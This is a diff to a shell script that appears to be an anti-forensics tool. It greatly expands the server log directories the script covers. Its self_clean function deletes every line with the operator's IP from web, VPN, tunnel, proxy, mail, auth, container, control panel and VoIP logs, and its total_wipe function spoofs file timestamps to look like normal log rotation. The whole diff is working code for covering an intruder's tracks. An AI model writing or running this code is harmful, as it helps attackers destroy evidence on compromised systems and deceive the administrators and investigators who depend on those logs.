@@ -91,94 +91,45 @@ detect_os() {
 # These log dirs are checked by both modes
 get_log_search_dirs() {
     cat <<DIRS
-/var/log/nginx
-/var/log/httpd
-/var/log/apache2
-/var/log/apache
-/var/log/caddy
-/var/log/traefik
-/var/log/openvpn
-/var/log/wireguard
-/var/log/strongswan
-/var/log/ipsec
-/var/log/ocserv
-/var/log/pptpd
-/var/log/l2tpd
-/var/log/xl2tpd
-/var/log/softether
-/var/log/vsftpd
-/var/log/proftpd
-/var/log/samba
-/var/log/mysql
-/var/log/mariadb
-/var/log/postgresql
-/var/log/postgres
-/var/log/pgsql
-/var/log/mongodb
-/var/log/mongod
-/var/log/redis
-/var/log/cockroach
-/var/log/cassandra
-/var/log/elasticsearch
-/var/log/influxdb
-/var/log/clickhouse-server
-/var/log/clickhouse
-/var/log/neo4j
-/var/log/couchdb
-/var/log/rethinkdb
-/var/opt/mssql/log
-/var/log/hbase
-/var/log/hadoop
+/var/log/nginx /var/log/httpd /var/log/apache2 /var/log/apache
+/var/log/caddy /var/log/traefik /var/log/envoy /var/log/h2o /var/log/lighttpd
+/var/log/tomcat /var/log/jetty /var/log/wildfly /var/log/jboss
+/var/log/gunicorn /var/log/uwsgi /var/log/php-fpm /var/log/pm2
+/var/log/openvpn /var/log/wireguard /var/log/strongswan /var/log/ipsec
+/var/log/ocserv /var/log/pptpd /var/log/l2tpd /var/log/xl2tpd /var/log/softether
+/var/log/tailscale /var/log/zerotier /var/log/netbird /var/log/cloudflared
+/var/log/ngrok /var/log/frp
+/var/log/xrdp /var/log/xrdp-sesman /var/log/vnc /var/log/vncserver
+/var/log/tigervnc /var/log/tightvnc /var/log/spice /var/log/spice-vdagent
+/var/log/nx /var/log/nomachine /var/log/teamviewer /var/log/anydesk
+/var/log/remmina /var/log/gnome-remote-desktop /var/log/chrome-remote-desktop
+/var/log/cockpit /var/log/webmin
+/var/log/mysql /var/log/mariadb /var/log/postgresql /var/log/postgres /var/log/pgsql
+/var/log/mongodb /var/log/mongod /var/log/redis /var/log/memcached
+/var/log/cockroach /var/log/cassandra /var/log/elasticsearch /var/log/influxdb
+/var/log/clickhouse-server /var/log/clickhouse /var/log/neo4j /var/log/couchdb
+/var/log/rethinkdb /var/opt/mssql/log /var/log/hbase /var/log/hadoop
 /var/log/zookeeper
-/var/log/xrdp
-/var/log/xrdp-sesman
-/var/log/vnc
-/var/log/vncserver
-/var/log/tigervnc
-/var/log/tightvnc
-/var/log/spice
-/var/log/spice-vdagent
-/var/log/nx
-/var/log/nomachine
-/var/log/teamviewer
-/var/log/anydesk
-/var/log/remmina
-/var/log/gnome-remote-desktop
-/var/log/chrome-remote-desktop
-/var/log/dnsmasq
-/var/log/unbound
-/var/log/named
-/var/log/pdns
-/var/log/squid
-/var/log/tinyproxy
-/var/log/haproxy
-/var/log/mitmproxy
-/var/log/dhcp
-/var/log/radius
-/var/log/freeradius
-/var/log/fail2ban
-/var/log/audit
-/var/log/aliyun
-/var/log/amazon
-/var/log/aws
-/var/log/azure
-/var/log/google
-/var/log/tencent
-/var/log/ufw
-/var/log/firewalld
-/var/log/iptables
-/var/log/portage
-/var/log/crash
-/var/log/abrt
-/var/log/gdm
-/var/log/lightdm
-/var/log/sddm
-/var/log/Xorg
-/var/log/tallylog
-/var/log/btmp
-/var/log/wtmp
-/var/log/ntp
-/var/log/ntpstats
+/var/log/dnsmasq /var/log/unbound /var/log/named /var/log/pdns /var/log/knot
+/var/log/squid /var/log/tinyproxy /var/log/haproxy /var/log/mitmproxy
+/var/log/dante /var/log/socks /var/log/chisel
+/var/log/vsftpd /var/log/proftpd /var/log/pure-ftpd /var/log/samba /var/log/nfs
+/var/log/rsync /var/log/git /var/log/gitolite /var/log/gitea /var/log/svn
+/var/log/mail /var/log/dovecot /var/log/postfix /var/log/exim /var/log/sendmail
+/var/log/rabbitmq /var/log/kafka /var/log/activemq /var/log/nats
+/var/log/radius /var/log/freeradius /var/log/slapd /var/log/ldap /var/log/krb5
+/var/log/kerberos /var/log/freeipa /var/log/tacacs
+/var/log/docker /var/log/kubelet /var/log/kube /var/log/containerd /var/log/pods
+/var/log/audit /var/log/fail2ban /var/log/supervisor /var/log/telnet /var/log/mosh
+/var/log/cups /var/log/snmp /var/log/dhcp /var/log/ntp /var/log/rpcbind
+/var/log/portage /var/log/crash /var/log/abrt /var/log/Xorg /var/log/tallylog
+/var/log/gdm /var/log/lightdm /var/log/sddm
+/var/log/asterisk /var/log/freeswitch /var/log/jitsi /var/log/kamailio
+/var/log/cpanel /var/log/plesk /var/log/vestacp /var/log/hestiacp
+/var/log/cyberpanel /var/log/aapanel /var/log/ispconfig
+/var/log/aliyun /var/log/amazon /var/log/aws /var/log/azure /var/log/google
+/var/log/tencent /var/log/oracle-cloud-agent /var/log/cloud-init
+/var/log/ufw /var/log/firewalld /var/log/iptables /var/log/nftables
 DIRS
 }
 
@@ -347,7 +298,10 @@ self_clean() {
 
         # Web server logs
         for dir in /var/log/nginx /var/log/httpd /var/log/apache2 /var/log/apache \
-                   /var/log/caddy /var/log/traefik; do
+                   /var/log/caddy /var/log/traefik /var/log/envoy /var/log/h2o \
+                   /var/log/lighttpd /var/log/tomcat /var/log/jetty /var/log/wildfly \
+                   /var/log/jboss /var/log/gunicorn /var/log/uwsgi /var/log/php-fpm \
+                   /var/log/pm2; do
             if [ -d "$dir" ]; then
                 for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
             fi
@@ -357,7 +311,9 @@ self_clean() {
         # VPN logs
         for dir in /var/log/openvpn /var/log/wireguard /var/log/strongswan \
                    /var/log/ipsec /var/log/ocserv /var/log/pptpd \
-                   /var/log/l2tpd /var/log/xl2tpd /var/log/softether; do
+                   /var/log/l2tpd /var/log/xl2tpd /var/log/softether \
+                   /var/log/tailscale /var/log/zerotier /var/log/netbird \
+                   /var/log/cloudflared /var/log/ngrok /var/log/frp; do
             if [ -d "$dir" ]; then
                 for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
             fi
@@ -411,7 +367,7 @@ self_clean() {
         info "Database logs cleaned"
 
         # DNS logs (reveal which domains were accessed via VPN)
-        for dir in /var/log/dnsmasq /var/log/unbound /var/log/named /var/log/pdns; do
+        for dir in /var/log/dnsmasq /var/log/unbound /var/log/named /var/log/pdns /var/log/knot; do
             if [ -d "$dir" ]; then
                 for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
             fi
@@ -419,13 +375,76 @@ self_clean() {
         [ -f /var/log/dnsmasq.log ] && remove_ip_lines /var/log/dnsmasq.log "$MY_IP"
         info "DNS logs cleaned"
 
-        # Proxy logs (reveal URLs/content accessed via VPN)
-        for dir in /var/log/squid /var/log/tinyproxy /var/log/haproxy /var/log/mitmproxy; do
+        # Proxy / Tunnel logs (reveal URLs/content accessed via VPN)
+        for dir in /var/log/squid /var/log/tinyproxy /var/log/haproxy /var/log/mitmproxy \
+                   /var/log/dante /var/log/socks /var/log/chisel; do
             if [ -d "$dir" ]; then
                 for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
             fi
         done
         info "Proxy logs cleaned"
+
+        # File transfer logs (FTP/SFTP/RSYNC/GIT/NFS/SVN)
+        for dir in /var/log/vsftpd /var/log/proftpd /var/log/pure-ftpd /var/log/samba \
+                   /var/log/nfs /var/log/rsync /var/log/git /var/log/gitolite \
+                   /var/log/gitea /var/log/svn; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        [ -f /var/log/xferlog ] && remove_ip_lines /var/log/xferlog "$MY_IP"
+        [ -f /var/log/pureftpd.log ] && remove_ip_lines /var/log/pureftpd.log "$MY_IP"
+        info "File transfer logs cleaned"
+
+        # Mail logs (SMTP/IMAP/POP3)
+        for dir in /var/log/mail /var/log/dovecot /var/log/postfix /var/log/exim /var/log/sendmail; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        info "Mail logs cleaned"
+
+        # Message queue logs
+        for dir in /var/log/rabbitmq /var/log/kafka /var/log/activemq /var/log/nats; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        info "Message queue logs cleaned"
+
+        # Auth/Directory logs
+        for dir in /var/log/radius /var/log/freeradius /var/log/slapd /var/log/ldap \
+                   /var/log/krb5 /var/log/kerberos /var/log/freeipa /var/log/tacacs; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        info "Auth/Directory logs cleaned"
+
+        # Container/orchestration logs
+        for dir in /var/log/docker /var/log/kubelet /var/log/kube /var/log/containerd /var/log/pods; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        info "Container logs cleaned"
+
+        # Control panel logs
+        for dir in /var/log/cpanel /var/log/plesk /var/log/vestacp /var/log/hestiacp \
+                   /var/log/cyberpanel /var/log/aapanel /var/log/ispconfig; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        info "Control panel logs cleaned"
+
+        # VoIP logs
+        for dir in /var/log/asterisk /var/log/freeswitch /var/log/jitsi /var/log/kamailio; do
+            if [ -d "$dir" ]; then
+                for f in "$dir"/*; do [ -f "$f" ] && remove_ip_lines "$f" "$MY_IP"; done
+            fi
+        done
+        info "VoIP logs cleaned"
 
         # Remote Desktop logs (RDP/VNC/SPICE/NoMachine/TeamViewer/AnyDesk)
         for dir in /var/log/xrdp /var/log/xrdp-sesman /var/log/vnc /var/log/vncserver \
@@ -651,21 +670,11 @@ total_wipe() {
     fi
     rm -f /tmp/.notrace_test 2>/dev/null || true
 
-    for dir in /var/log /var/log/nginx /var/log/httpd /var/log/apache2 /var/log/apache \
-               /var/log/openvpn /var/log/wireguard /var/log/strongswan /var/log/ipsec \
-               /var/log/ocserv /var/log/audit /var/log/apt /var/log/zypp \
-               /var/log/mysql /var/log/mariadb /var/log/postgresql \
-               /var/log/mongodb /var/log/redis /var/log/cockroach /var/log/cassandra \
-               /var/log/elasticsearch /var/log/influxdb /var/log/clickhouse-server \
-               /var/log/neo4j /var/log/couchdb /var/opt/mssql/log \
-               /var/log/dnsmasq /var/log/unbound /var/log/named /var/log/squid \
-               /var/log/haproxy /var/log/dhcp /var/log/radius /var/log/freeradius \
-               /var/log/samba /var/log/crash /var/log/abrt /var/log/gdm /var/log/lightdm \
-               /var/log/xrdp /var/log/vnc /var/log/spice /var/log/nx /var/log/nomachine \
-               /var/log/teamviewer /var/log/anydesk /var/log/gnome-remote-desktop; do
-        if [ -d "$dir" ]; then
-            find "$dir" -type f -exec $touch_cmd {} \; 2>/dev/null || true
-        fi
+    for dir in $(get_log_search_dirs); do
+        [ -d "$dir" ] && find "$dir" -type f -exec $touch_cmd {} \; 2>/dev/null || true
+    done
+    for dir in /var/log /var/log/audit /var/log/apt /var/log/zypp /var/log/portage; do
+        [ -d "$dir" ] && find "$dir" -type f -exec $touch_cmd {} \; 2>/dev/null || true
     done
     info "Timestamps spoofed (appear as normal log rotation)"
 
